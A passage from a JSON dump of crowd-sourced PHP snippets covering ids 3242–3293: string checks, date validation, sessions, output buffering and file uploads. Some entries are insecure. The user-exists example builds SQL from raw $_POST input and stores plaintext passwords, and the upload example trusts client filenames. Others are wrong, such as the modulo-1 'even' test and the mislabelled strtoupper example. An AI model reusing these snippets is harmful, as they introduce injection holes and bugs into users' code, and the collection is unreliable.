  },
  {
    "id": 3242,
    "keyword": null,
    "link": null,
    "title": " php check if folder exists",
    "description": "<?php $directory = \"./videos/category/\"; if (!file_exists($directory)) {   mkdir($directory, 0777, true); } ?>\n <?php $filename = '/path/to/foo.txt';  if (file_exists($filename)) {     echo \"The file $filename exists\"; } else {     echo \"The file $filename does not exist\"; } ?>  \n",
    "reg_date": "2021-10-12T10:17:39.000Z"
  },
  {
    "id": 3243,
    "keyword": null,
    "link": null,
    "title": " php check if format is date",
    "description": "function validateDate($date, $format = 'Y-m-d') {     $d = DateTime::createFromFormat($format, $date);     // The Y ( 4 digits year ) returns TRUE for any integer with any number of digits so changing the comparison from == to === fixes the issue.     return $d && $d->format($format) === $date; }  Test cases: var_dump(validateDate('2013-13-01'));  // false var_dump(validateDate('20132-13-01')); // false var_dump(validateDate('2013-11-32'));  // false var_dump(validateDate('2012-2-25'));   // false var_dump(validateDate('2013-12-01'));  // true var_dump(validateDate('1970-12-01'));  // true var_dump(validateDate('2012-02-29'));  // true var_dump(validateDate('2012', 'Y'));   // true var_dump(validateDate('12012', 'Y'));  // false\nif (preg_match(\"/\\d{4}\\-\\d{2}-\\d{2}/\", $date)) {     echo 'true'; } else {     echo 'false'; }\nfunction isRealDate($date) {      if (false === strtotime($date)) {          return false;     }      list($year, $month, $day) = explode('-', $date);      return checkdate($month, $day, $year); } \n",
    "reg_date": "2021-10-12T10:17:39.000Z"
  },
  {
    "id": 3244,
    "keyword": null,
    "link": null,
    "title": " php check if image exists on remote server",
    "description": "function remote_file_exists($url) {     $ch = curl_init($url);     curl_setopt($ch, CURLOPT_NOBODY, true);     curl_exec($ch);     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);     curl_close($ch);     if( $httpCode == 200 ){return true;} }  //THE USE THE BELOW FUNCTION CALL  if(remote_file_exists($url)) {     //file exists, do something }\n",
    "reg_date": "2021-10-12T10:17:39.000Z"
  },
  {
    "id": 3245,
    "keyword": null,
    "link": null,
    "title": " php check if input is date",
    "description": "function isRealDate($date) {      if (false === strtotime($date)) {          return false;     }      list($year, $month, $day) = explode('-', $date);      return checkdate($month, $day, $year); } \n",
    "reg_date": "2021-10-12T10:17:39.000Z"
  },
  {
    "id": 3246,
    "keyword": null,
    "link": null,
    "title": " php check if input is int",
    "description": "$a = 5; //returns true $a = \"5\"; //returns false $a = 5.3; //returns false is_int($a);\n// Check if variable is int $id = \"1\";  if(!intval($id)){   throw new Exception(\"Not Int\", 404); } else{ \t// this variable is int }\n",
    "reg_date": "2021-10-12T10:17:39.000Z"
  },
  {
    "id": 3247,
    "keyword": null,
    "link": null,
    "title": " php check if input type file is emty",
    "description": "/*   =============Input Type File============= */ $is_uploading = $_FILES[\"inputfilename\"][\"error\"]; /*   the variable $is_uploading has value either 0 or 4   0 => the user is uploading specific files or images   4 => user is not uploading anything */ $can_pass = $is_uploading == 0 ? true : false; if($can_pass){   echo \"You can Pass\"; } else{   echo \"Please upload. Your request has empty files.\"; } \n",
    "reg_date": "2021-10-12T10:17:40.000Z"
  },
  {
    "id": 3248,
    "keyword": null,
    "link": null,
    "title": " php check if int is odd",
    "description": "$num = 85; if($num % 2 == 0){ echo \"this is even number\";  }else{ echo \"this is odd number\"; } \n$num = 34; if ($num % 2 == 0) {   print \"It's even\"; }\n$number = 15; if ($number % 1 == 0) {     echo \"It's even\"; }else{     echo \"oneven\"; }\n",
    "reg_date": "2021-10-12T10:17:40.000Z"
  },
  {
    "id": 3249,
    "keyword": null,
    "link": null,
    "title": " php check if its a name",
    "description": "//You should use a regex filter with preg_match who returns 1 or 0  // this filter works for most of cases  /* use this regex */ preg_match(\"/^[a-z ,.'-]+$/i\", your_string);\n",
    "reg_date": "2021-10-12T10:17:40.000Z"
  },
  {
    "id": 3250,
    "keyword": null,
    "link": null,
    "title": " php check if json",
    "description": "function isJson($string) {  json_decode($string);  return (json_last_error() == JSON_ERROR_NONE); }\n//Simple if (is_object(json_decode($var))) {    .... }  //Else var $x = json_decode($var); var $y = is_object($x)?$x:....;  //Better function json_validate($string) {     // decode the JSON data     $result = json_decode($string);      // switch and check possible JSON errors     switch (json_last_error()) {         case JSON_ERROR_NONE:             $error = ''; // JSON is valid // No error has occurred             break;         case JSON_ERROR_DEPTH:             $error = 'The maximum stack depth has been exceeded.';             break;         case JSON_ERROR_STATE_MISMATCH:             $error = 'Invalid or malformed JSON.';             break;         case JSON_ERROR_CTRL_CHAR:             $error = 'Control character error, possibly incorrectly encoded.';             break;         case JSON_ERROR_SYNTAX:             $error = 'Syntax error, malformed JSON.';             break;         // PHP >= 5.3.3         case JSON_ERROR_UTF8:             $error = 'Malformed UTF-8 characters, possibly incorrectly encoded.';             break;         // PHP >= 5.5.0         case JSON_ERROR_RECURSION:             $error = 'One or more recursive references in the value to be encoded.';             break;         // PHP >= 5.5.0         case JSON_ERROR_INF_OR_NAN:             $error = 'One or more NAN or INF values in the value to be encoded.';             break;         case JSON_ERROR_UNSUPPORTED_TYPE:             $error = 'A value of a type that cannot be encoded was given.';             break;         default:             $error = 'Unknown JSON error occured.';             break;     }      if ($error !== '') {         // throw the Exception or exit // or whatever :)         exit($error);     }     // everything is OK     return $result; } $output = json_validate($json);\n@json_decode($page_str); $json_OK=\tjson_last_error() == JSON_ERROR_NONE; \n",
    "reg_date": "2021-10-12T10:17:40.000Z"
  },
  {
    "id": 3251,
    "keyword": null,
    "link": null,
    "title": " php check if number between range",
    "description": "($min <= $value) && ($value <= $max)\n",
    "reg_date": "2021-10-12T10:17:40.000Z"
  },
  {
    "id": 3252,
    "keyword": null,
    "link": null,
    "title": " php check if object has attribute",
    "description": "if(property_exists($car,color)){ \t//$car->color exists }\n",
    "reg_date": "2021-10-12T10:17:40.000Z"
  },
  {
    "id": 3253,
    "keyword": null,
    "link": null,
    "title": " php check if parameter exists",
    "description": "if(isset($_GET['id'])) {    $slide = $_GET['id'] // Getting parameter value inside PHP variable }\n",
    "reg_date": "2021-10-12T10:17:40.000Z"
  },
  {
    "id": 3254,
    "keyword": null,
    "link": null,
    "title": " php check if post file is empty",
    "description": "/*   =============Input Type File=============   other inputs can be easly validated using the HTML required attr or using    php empty() function */ $is_uploading = $_FILES[\"inputfilename\"][\"error\"]; /*   the variable $is_uploading has value either 0 or 4   0 => the user is uploading specific files or images   4 => user is not uploading anything */ $can_pass = $is_uploading == 0 ? true : false; if($can_pass){   echo \"You can Pass\"; } else{   echo \"Please upload. Your request has empty files.\"; }\nif ($_FILES['cover_image']['size'] == 0 && $_FILES['cover_image']['error'] == 0) {     // cover_image is empty (and not an error) }\n",
    "reg_date": "2021-10-12T10:17:40.000Z"
  },
  {
    "id": 3255,
    "keyword": null,
    "link": null,
    "title": " php check if session is running",
    "description": "<?php if(session_status() == PHP_SESSION_ACTIVE){     //a session is already running     session_destroy(); //stops the session } ?>\n",
    "reg_date": "2021-10-12T10:17:40.000Z"
  },
  {
    "id": 3256,
    "keyword": null,
    "link": null,
    "title": " php check if specific input empty",
    "description": "/*   =============Input Type File============= */ $is_uploading = $_FILES[\"inputfilename\"][\"error\"]; /*   the variable $is_uploading has value either 0 or 4   0 => the user is uploading specific files or images   4 => user is not uploading anything */ $can_pass = $is_uploading == 0 ? true : false; if($can_pass){   echo \"You can Pass\"; } else{   echo \"Please upload. Your request has empty files.\"; }\n$a = empty($a) ? \"Default value\" : $a;\n",
    "reg_date": "2021-10-12T10:17:40.000Z"
  },
  {
    "id": 3257,
    "keyword": null,
    "link": null,
    "title": " php check if string contains",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$string = 'The lazy fox jumped over the fence';  if (str_contains($string, 'lazy')) {     echo \"The string 'lazy' was found in the string\\n\"; }  \n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; } \nif (strpos($string, 'substring') !== false) { \t// do stuff  }\n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; }\n// returns true if $needle is a substring of $haystack function contains($haystack, $needle){     return strpos($haystack, $needle) !== false; }\n",
    "reg_date": "2021-10-12T10:17:41.000Z"
  },
  {
    "id": 3258,
    "keyword": null,
    "link": null,
    "title": " php check if string contains a char",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$result = strpos(\"haystack\", \"needle\");  if ($result != false) {   // text found }\nif (strpos($haystack,$needle) !== false) {     echo \"$haystack contains $needle\"; }\n$haystack = 'This is my haystack that we shall check' $has_A = strpos($haystack, 'A') !== false; $has_a = strpos($haystack, 'a') !== false; \n// returns true if $needle is a substring of $haystack function contains($haystack, $needle){     return strpos($haystack, $needle) !== false; }\n",
    "reg_date": "2021-10-12T10:17:41.000Z"
  },
  {
    "id": 3259,
    "keyword": null,
    "link": null,
    "title": " php check if string contains number",
    "description": "if (preg_match('/[A-Za-z]/', $myString) && preg_match('/[0-9]/', $myString)) {     echo 'Contains at least one letter and one number'; }\n",
    "reg_date": "2021-10-12T10:17:41.000Z"
  },
  {
    "id": 3260,
    "keyword": null,
    "link": null,
    "title": " php check if string contains url",
    "description": "if(strpos($_SERVER['REQUEST_URI'], \"string\")) {   ... }\n<?php   if(filter_var($imagePath, FILTER_VALIDATE_URL) === FALSE){       echo \"Not valide URL\";   }else{       echo \"valide URL\";   }\npreg_match('/(http|ftp|mailto)/', $string, $matches); var_dump($matches);\n",
    "reg_date": "2021-10-12T10:17:41.000Z"
  },
  {
    "id": 3261,
    "keyword": null,
    "link": null,
    "title": " php check if string contains word",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$a = 'Hello world?';  if (strpos($a, 'Hello') !== false) { //PAY ATTENTION TO !==, not !=     echo 'true'; } if (stripos($a, 'HELLO') !== false) { //Case insensitive     echo 'true'; }\nif (strpos($haystack,$needle) !== false) {     echo \"$haystack contains $needle\"; }\n// returns true if $needle is a substring of $haystack function contains($haystack, $needle){     return strpos($haystack, $needle) !== false; }\n$myString = 'Hello Bob how are you?'; if (strpos($myString, 'Bob') !== false) {     echo \"My string contains Bob\"; }\nphpCopy<?php $mystring = \"This is a PHP program.\";  if (strpos($mystring, \"program.\") !== false) {     echo(\"True\"); } ?> \n",
    "reg_date": "2021-10-12T10:17:41.000Z"
  },
  {
    "id": 3262,
    "keyword": null,
    "link": null,
    "title": " php check if string email",
    "description": "<?php     if(filter_var(\"some@address.com\", FILTER_VALIDATE_EMAIL)) {         // valid address     }     else {         // invalid address     } ?> \n",
    "reg_date": "2021-10-12T10:17:41.000Z"
  },
  {
    "id": 3263,
    "keyword": null,
    "link": null,
    "title": " php check if string or number",
    "description": "$var_num = \"1\"; $var_str = \"Hello World\";  var_dump( is_numeric($var_num), is_numeric($var_str) );  /*  Output -  bool(true)  bool(false) */\n <?php if (is_numeric(887)) { echo \"Yes\"; } else { echo \"No\"; } ?>\n <?php if (is_numeric(\"cake\")) { echo \"Yes\"; } else { echo \"No\"; } ?>\n",
    "reg_date": "2021-10-12T10:17:41.000Z"
  },
  {
    "id": 3264,
    "keyword": null,
    "link": null,
    "title": " php check if uploaded file is image",
    "description": "$image_name = $_FILES[\"inputname\"][\"name\"]; $allowed_extensions = array(\"png\", \"jpg\", \"jpeg\"); $image_extension = explode(\".\", $image_name); /*   *Explode returns array of words   *Explode Example:   \texplode(search_for, where to search for);     let imagine that the image named => myimage.png     expldoe funtion will search the word for '.' and explode it     from the example, explode will return array(\"myimage\", \"png\")     Now we find our image extension, but it is in the array.     we use end() function that will return the last index in the array as a string */ $extension = end($image_extension); // which is png if(!in_array($extension, $allowed_extensions)){   echo \"Please upload an image\"; } else{   echo \"Allowed Image\"; }\n",
    "reg_date": "2021-10-12T10:17:41.000Z"
  },
  {
    "id": 3265,
    "keyword": null,
    "link": null,
    "title": " php check if user exists in database",
    "description": "$q = mysql_query(\"SELECT username FROM User WHERE username=$username\", $cnn); if (mysql_num_rows($q) != 0) { echo \"Username exists\"; } else { echo \"Write your code here\"; }\n$firstname = $_POST[\"firstname\"]; $lastname = $_POST[\"lastname\"]; $email = $_POST[\"email\"]; $pass = $_POST[\"password\"];  $check_email = mysqli_query($conn, \"SELECT Email FROM crud where Email = '$email' \"); if(mysqli_num_rows($check_email) > 0){     echo('Email Already exists'); } else{     if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") {     $result = mysqli_query($conn, \"INSERT INTO crud (Firstname, Lastname, Email, Password) VALUES ('$firstname', '$lastname', '$email', '$pass')\"); }     echo('Record Entered Successfully'); } \n",
    "reg_date": "2021-10-12T10:17:41.000Z"
  },
  {
    "id": 3266,
    "keyword": null,
    "link": null,
    "title": " php check if value exists in multidimensional array",
    "description": "// 1d array in_array('something', $array);  // 2d array array_column($multi_array, 'your_column');  /** 0 => ['hi'=>0, 'your_column'=>1, 'hi'=>0, 'your_column'=>3] will be [1, 3] and then you can apply the in_array function on that new array ^ */\n$userdb=Array ( (0) => Array     (         (uid) => '100',         (name) => 'Sandra Shush',         (url) => 'urlof100'     ),  (1) => Array     (         (uid) => '5465',         (name) => 'Stefanie Mcmohn',         (pic_square) => 'urlof100'     ),  (2) => Array     (         (uid) => '40489',         (name) => 'Michael',         (pic_square) => 'urlof40489'     ) );  $key = array_search(40489, array_column($userdb, 'uid'));\n",
    "reg_date": "2021-10-12T10:17:41.000Z"
  },
  {
    "id": 3267,
    "keyword": null,
    "link": null,
    "title": " php check if variable is int",
    "description": "$a = 5; //returns true $a = \"5\"; //returns false $a = 5.3; //returns false is_int($a);\n// to check the input integer validation we can use is_int() function Syntax: is_int(parameter);  $x = 10; //returns true $x = \"123\"; //returns false $x = 12.365; //returns false $x = \"ankur\"; //returns false is_int($x);\n// Check if variable is int $id = \"1\";  if(!intval($id)){   throw new Exception(\"Not Int\", 404); } else{ \t// this variable is int }\n<?php $strings = array('1820.20', '10002', 'wsl!12'); foreach ($strings as $testcase) {     if (ctype_digit($testcase)) {         echo \"The string $testcase consists of all digits.\\n\";     } else {         echo \"The string $testcase does not consist of all digits.\\n\";     } } ?>\n",
    "reg_date": "2021-10-12T10:17:41.000Z"
  },
  {
    "id": 3268,
    "keyword": null,
    "link": null,
    "title": " php check internet connection",
    "description": "$response = null; system(\"ping -c 1 google.com\", $response); if($response == 0) {     // this means you are connected }\nfunction is_connected() {     $connected = @fsockopen(\"www.example.com\", 80);                                          //website, port  (try 80 or 443)     if ($connected){         $is_conn = true; //action when connected         fclose($connected);     }else{         $is_conn = false; //action in connection failure     }     return $is_conn;  }\n",
    "reg_date": "2021-10-12T10:17:42.000Z"
  },
  {
    "id": 3269,
    "keyword": null,
    "link": null,
    "title": " php check method of http request",
    "description": "<?php  $method = $_SERVER['REQUEST_METHOD'];  switch ($method) {   case 'GET':     //Here Handle GET Request     echo 'You are using '.$method.' Method';     break;   case 'POST':     //Here Handle POST Request     echo 'You are using '.$method.' Method';     break;   case 'PUT':     //Here Handle PUT Request     echo 'You are using '.$method.' Method';     break;   case 'PATCH':     //Here Handle PATCH Request     echo 'You are using '.$method.' Method';     break;   case 'DELETE':     //Here Handle DELETE Request     echo 'You are using '.$method.' Method';     break;   case 'COPY':       //Here Handle COPY Request       echo 'You are using '.$method.' Method';       break;    case 'OPTIONS':       //Here Handle OPTIONS Request       echo 'You are using '.$method.' Method';       break;   case 'LINK':       //Here Handle LINK Request       echo 'You are using '.$method.' Method';       break;   case 'UNLINK':       //Here Handle UNLINK Request       echo 'You are using '.$method.' Method';       break;   case 'PURGE':       //Here Handle PURGE Request       echo 'You are using '.$method.' Method';       break;   case 'LOCK':       //Here Handle LOCK Request       echo 'You are using '.$method.' Method';       break;   case 'UNLOCK':       //Here Handle UNLOCK Request       echo 'You are using '.$method.' Method';       break;   case 'PROPFIND':       //Here Handle PROPFIND Request       echo 'You are using '.$method.' Method';       break;   case 'VIEW':       //Here Handle VIEW Request       echo 'You are using '.$method.' Method';       break;   Default:     echo 'You are using '.$method.' Method';   break; }   ?>\n$_SERVER['REQUEST_METHOD']\n",
    "reg_date": "2021-10-12T10:17:42.000Z"
  },
  {
    "id": 3270,
    "keyword": null,
    "link": null,
    "title": " php check name",
    "description": "//You should use a regex filter with preg_match who returns 1 or 0  // this filter works for most of cases  /* use this regex */ preg_match(\"/^[a-z ,.'-]+$/i\", your_string);\n",
    "reg_date": "2021-10-12T10:17:42.000Z"
  },
  {
    "id": 3271,
    "keyword": null,
    "link": null,
    "title": " php check regular string",
    "description": "//You should use a regex filter with preg_match who returns 1 or 0  // this filter works for most of cases  /* use this regex */ preg_match(\"/^[a-z ,.'-]+$/i\", your_string);  if you want more regex filters you can make yours on 'https://regex101.com/'\n",
    "reg_date": "2021-10-12T10:17:42.000Z"
  },
  {
    "id": 3272,
    "keyword": null,
    "link": null,
    "title": " php check request method",
    "description": "if ($_SERVER['REQUEST_METHOD'] === 'POST') {      // Boom baby we a POST method } if ($_SERVER['REQUEST_METHOD'] === 'GET') {      // We are a GET method }\n<?php  $method = $_SERVER['REQUEST_METHOD'];  switch ($method) {   case 'GET':     //Here Handle GET Request     echo 'You are using '.$method.' Method';     break;   case 'POST':     //Here Handle POST Request     echo 'You are using '.$method.' Method';     break;   case 'PUT':     //Here Handle PUT Request     echo 'You are using '.$method.' Method';     break;   case 'PATCH':     //Here Handle PATCH Request     echo 'You are using '.$method.' Method';     break;   case 'DELETE':     //Here Handle DELETE Request     echo 'You are using '.$method.' Method';     break;   case 'COPY':       //Here Handle COPY Request       echo 'You are using '.$method.' Method';       break;    case 'OPTIONS':       //Here Handle OPTIONS Request       echo 'You are using '.$method.' Method';       break;   case 'LINK':       //Here Handle LINK Request       echo 'You are using '.$method.' Method';       break;   case 'UNLINK':       //Here Handle UNLINK Request       echo 'You are using '.$method.' Method';       break;   case 'PURGE':       //Here Handle PURGE Request       echo 'You are using '.$method.' Method';       break;   case 'LOCK':       //Here Handle LOCK Request       echo 'You are using '.$method.' Method';       break;   case 'UNLOCK':       //Here Handle UNLOCK Request       echo 'You are using '.$method.' Method';       break;   case 'PROPFIND':       //Here Handle PROPFIND Request       echo 'You are using '.$method.' Method';       break;   case 'VIEW':       //Here Handle VIEW Request       echo 'You are using '.$method.' Method';       break;   Default:     echo 'You are using '.$method.' Method';   break; }   ?>\n$_SERVER['REQUEST_METHOD']\n",
    "reg_date": "2021-10-12T10:17:42.000Z"
  },
  {
    "id": 3273,
    "keyword": null,
    "link": null,
    "title": " php check undefined offset",
    "description": "// $key = 10, if $array does not have $array[10] set, it will return false // If $array[10] has any value, it will return true if(array_key_exists($key, $array)){}\nIf preg_match did not find a match, $matches is an empty array. So you should check if preg_match found an match before accessing $matches[0], for example:  function get_match($regex,$content) {     if (preg_match($regex,$content,$matches)) {         return $matches[0];     } else {         return null;     } }\n",
    "reg_date": "2021-10-12T10:17:42.000Z"
  },
  {
    "id": 3274,
    "keyword": null,
    "link": null,
    "title": " php check valid json string",
    "description": "function isJson($string) {  json_decode($string);  return (json_last_error() == JSON_ERROR_NONE); }\n//Simple if (is_object(json_decode($var))) {    .... }  //Else var $x = json_decode($var); var $y = is_object($x)?$x:....;  //Better function json_validate($string) {     // decode the JSON data     $result = json_decode($string);      // switch and check possible JSON errors     switch (json_last_error()) {         case JSON_ERROR_NONE:             $error = ''; // JSON is valid // No error has occurred             break;         case JSON_ERROR_DEPTH:             $error = 'The maximum stack depth has been exceeded.';             break;         case JSON_ERROR_STATE_MISMATCH:             $error = 'Invalid or malformed JSON.';             break;         case JSON_ERROR_CTRL_CHAR:             $error = 'Control character error, possibly incorrectly encoded.';             break;         case JSON_ERROR_SYNTAX:             $error = 'Syntax error, malformed JSON.';             break;         // PHP >= 5.3.3         case JSON_ERROR_UTF8:             $error = 'Malformed UTF-8 characters, possibly incorrectly encoded.';             break;         // PHP >= 5.5.0         case JSON_ERROR_RECURSION:             $error = 'One or more recursive references in the value to be encoded.';             break;         // PHP >= 5.5.0         case JSON_ERROR_INF_OR_NAN:             $error = 'One or more NAN or INF values in the value to be encoded.';             break;         case JSON_ERROR_UNSUPPORTED_TYPE:             $error = 'A value of a type that cannot be encoded was given.';             break;         default:             $error = 'Unknown JSON error occured.';             break;     }      if ($error !== '') {         // throw the Exception or exit // or whatever :)         exit($error);     }     // everything is OK     return $result; } $output = json_validate($json);\n@json_decode($page_str); $json_OK=\tjson_last_error() == JSON_ERROR_NONE; \n",
    "reg_date": "2021-10-12T10:17:42.000Z"
  },
  {
    "id": 3275,
    "keyword": null,
    "link": null,
    "title": " php check version ubuntu",
    "description": " php --version \n/* in terminal type it*/ php -v\nphp -version\n# php -v PHP 5.4.16 (cli) (built: Mar  7 2018 13:34:47)  Copyright (c) 1997-2013 The PHP Group Zend Engine v2.4.0, Copyright (c) 1998-2013 Zend Technologies\n# php --version PHP 5.4.16 (cli) (built: Mar  7 2018 13:34:47)  Copyright (c) 1997-2013 The PHP Group Zend Engine v2.4.0, Copyright (c) 1998-2013 Zend Technologies\n",
    "reg_date": "2021-10-12T10:17:42.000Z"
  },
  {
    "id": 3276,
    "keyword": null,
    "link": null,
    "title": " php check weekday of date",
    "description": "$dayofweek = date('w', strtotime($date)); $result    = date('Y-m-d', strtotime(($day - $dayofweek).' day', strtotime($date)));\n Things to be aware of when using week numbers with years.  <?php echo date(\"YW\", strtotime(\"2011-01-07\")); // gives 201101 echo date(\"YW\", strtotime(\"2011-12-31\")); // gives 201152 echo date(\"YW\", strtotime(\"2011-01-01\")); // gives 201152 too ?>  BUT  <?php echo date(\"oW\", strtotime(\"2011-01-07\")); // gives 201101 echo date(\"oW\", strtotime(\"2011-12-31\")); // gives 201152 echo date(\"oW\", strtotime(\"2011-01-01\")); // gives 201052 (Year is different than previous example) ?>  Reason: Y is year from the date o is ISO-8601 year number W is ISO-8601 week number of year  Conclusion: if using 'W' for the week number use 'o' for the year. \n",
    "reg_date": "2021-10-12T10:17:42.000Z"
  },
  {
    "id": 3277,
    "keyword": null,
    "link": null,
    "title": " php chunk array",
    "description": "$array=['a','b','c','d','e','f','g']; $chunckedArray=array_chunk($array,3); //output: $chunkedArray=[['a','b','c'],['d','e','f'],['g']] //Array ( [0] => Array ( [0] => a [1] => b [2] => c ) [1] => Array ( [0] => d [1] => e [2] => f ) [2] => Array ( [0] => g ) )\n",
    "reg_date": "2021-10-12T10:17:43.000Z"
  },
  {
    "id": 3278,
    "keyword": null,
    "link": null,
    "title": " php clean all output buffers",
    "description": "while ( ob_get_level() ) {   ob_end_clean(); }\n",
    "reg_date": "2021-10-12T10:17:43.000Z"
  },
  {
    "id": 3279,
    "keyword": null,
    "link": null,
    "title": " php clean html tags",
    "description": "strip_tags($var);\n<?php $text = '<p>Test paragraph.</p><!-- Comment --> <a href=\"#fragment\">Other text</a>'; echo strip_tags($text); //Test paragraph. Other text  // Allow <p> and <a> echo strip_tags($text, '<p><a>'); //<p>Test paragraph.</p> <a href=\"#fragment\">Other text</a> // as of PHP 7.4.0 the line above can be written as: // echo strip_tags($text, ['p', 'a']); ?>  \n",
    "reg_date": "2021-10-12T10:17:43.000Z"
  },
  {
    "id": 3280,
    "keyword": null,
    "link": null,
    "title": " php clear cache",
    "description": "header(\"Cache-Control: no-cache, must-revalidate\"); header(\"Expires: Mon, 26 Jul 1997 05:00:00 GMT\"); header(\"Content-Type: application/xml; charset=utf-8\");\n",
    "reg_date": "2021-10-12T10:17:43.000Z"
  },
  {
    "id": 3281,
    "keyword": null,
    "link": null,
    "title": " php clear echo",
    "description": "ob_end_clean();\n<?php  ob_start(); echo 'a'; print 'b';  // some statement that removes all printed/echoed items ob_end_clean();  echo 'c';  // the final output is equal to 'c', not 'abc'  ?>\n",
    "reg_date": "2021-10-12T10:17:43.000Z"
  },
  {
    "id": 3282,
    "keyword": null,
    "link": null,
    "title": " php clear output",
    "description": "ob_end_clean();\n<?php  ob_start(); echo 'a'; print 'b';  // some statement that removes all printed/echoed items ob_end_clean();  echo 'c';  // the final output is equal to 'c', not 'abc'  ?>\n",
    "reg_date": "2021-10-12T10:17:43.000Z"
  },
  {
    "id": 3283,
    "keyword": null,
    "link": null,
    "title": " php clear session",
    "description": "session_destroy(); // To delete whole session // OR unset($_SESSION['myVar']); // To delete a session var\n<?php   session_start(); // start session  session_destroy();  // Delete whole session // OR unset($_SESSION['username']); // delete any specific session only ?>\n<?php    unset($_SESSION['counter']); ?>\nsession_unset();    //Destrol all session variables\n<?php // Destroy the currently active session. session_destroy(); ?>\n<?php session_destroy(); ?>  \n",
    "reg_date": "2021-10-12T10:17:43.000Z"
  },
  {
    "id": 3284,
    "keyword": null,
    "link": null,
    "title": " php cli display errors",
    "description": "// Add these lines somewhere on top of your PHP file: ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);\nphp -d display_errors=on  script.php \nerror_reporting(E_ALL); ini_set('display_errors', '1'); \n",
    "reg_date": "2021-10-12T10:17:43.000Z"
  },
  {
    "id": 3285,
    "keyword": null,
    "link": null,
    "title": " php clone",
    "description": "//Copies an existing object $objectA = clone $objectB;\n$objectB = clone $objectA;\n",
    "reg_date": "2021-10-12T10:17:43.000Z"
  },
  {
    "id": 3286,
    "keyword": null,
    "link": null,
    "title": " php clone object",
    "description": "$objectB = clone $objectA;\n",
    "reg_date": "2021-10-12T10:17:43.000Z"
  },
  {
    "id": 3287,
    "keyword": null,
    "link": null,
    "title": " php close curl",
    "description": "curl_close($ch)\n",
    "reg_date": "2021-10-12T10:17:43.000Z"
  },
  {
    "id": 3288,
    "keyword": null,
    "link": null,
    "title": " php code for getting the next day",
    "description": "$tomorrow = date(\"Y-m-d\", strtotime(\"+1 day\"));\n",
    "reg_date": "2021-10-12T10:17:44.000Z"
  },
  {
    "id": 3289,
    "keyword": null,
    "link": null,
    "title": " php code for video upload",
    "description": "<?php  $allowedExts = array(\"jpg\", \"jpeg\", \"gif\", \"png\", \"mp3\", \"mp4\", \"wma\"); $extension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);  if ((($_FILES[\"file\"][\"type\"] == \"video/mp4\") || ($_FILES[\"file\"][\"type\"] == \"audio/mp3\") || ($_FILES[\"file\"][\"type\"] == \"audio/wma\") || ($_FILES[\"file\"][\"type\"] == \"image/pjpeg\") || ($_FILES[\"file\"][\"type\"] == \"image/gif\") || ($_FILES[\"file\"][\"type\"] == \"image/jpeg\"))  && ($_FILES[\"file\"][\"size\"] < 20000) && in_array($extension, $allowedExts))    {   if ($_FILES[\"file\"][\"error\"] > 0)     {     echo \"Return Code: \" . $_FILES[\"file\"][\"error\"] . \"<br />\";     }   else     {     echo \"Upload: \" . $_FILES[\"file\"][\"name\"] . \"<br />\";     echo \"Type: \" . $_FILES[\"file\"][\"type\"] . \"<br />\";     echo \"Size: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" Kb<br />\";     echo \"Temp file: \" . $_FILES[\"file\"][\"tmp_name\"] . \"<br />\";      if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"]))       {       echo $_FILES[\"file\"][\"name\"] . \" already exists. \";       }     else       {       move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],       \"upload/\" . $_FILES[\"file\"][\"name\"]);       echo \"Stored in: \" . \"upload/\" . $_FILES[\"file\"][\"name\"];       }     }   } else   {   echo \"Invalid file\";   } ?> \n<form method=\"post\" enctype=\"multipart/form-data\">     <div><?php echo $message; ?></div>     <?php echo $max_file_size_tag; ?>     <input type=\"file\" accept=\"video/*\" ID=\"fileSelect\" runat=\"server\" size=\"20\" name=\"filename\" action=\"/vids/file-upload.php\">     <select name=\"course\">         <option value=\"select\" selected>Select</option>         <option value=\"java\">Java</option>         <option value=\"python\">Python</option>         <option value=\"vb\">Visual Basic</option>         <option value=\"c\">C/C++</option>         <option value=\"ruby\">Ruby</option>     </select>     <input type=\"submit\" value=\"Upload\" name=\"submit\"> </form> \n",
    "reg_date": "2021-10-12T10:17:44.000Z"
  },
  {
    "id": 3290,
    "keyword": null,
    "link": null,
    "title": " php code to check if variable is null",
    "description": "if(empty($var1)){     echo 'This line is printed, because the $var1 is empty.'; }\nis_null($foo)\n",
    "reg_date": "2021-10-12T10:17:44.000Z"
  },
  {
    "id": 3291,
    "keyword": null,
    "link": null,
    "title": " php code to convert to small letter",
    "description": "$lowercase = \"this is lower case\"; $uppercase = strtoupper($lowercase);  echo $uppercase; // THIS IS LOWER CASE\nstring strtoupper ( $string ) \n$str = strtolower($str);\n",
    "reg_date": "2021-10-12T10:17:44.000Z"
  },
  {
    "id": 3292,
    "keyword": null,
    "link": null,
    "title": " php code to display current date and time in different formats",
    "description": "$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\necho date('Y.m.d H:i:s');\n$today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm\n",
    "reg_date": "2021-10-12T10:17:44.000Z"
  },
  {
    "id": 3293,
    "keyword": null,
    "link": null,
    "title": " php code to increase maximum execution time",
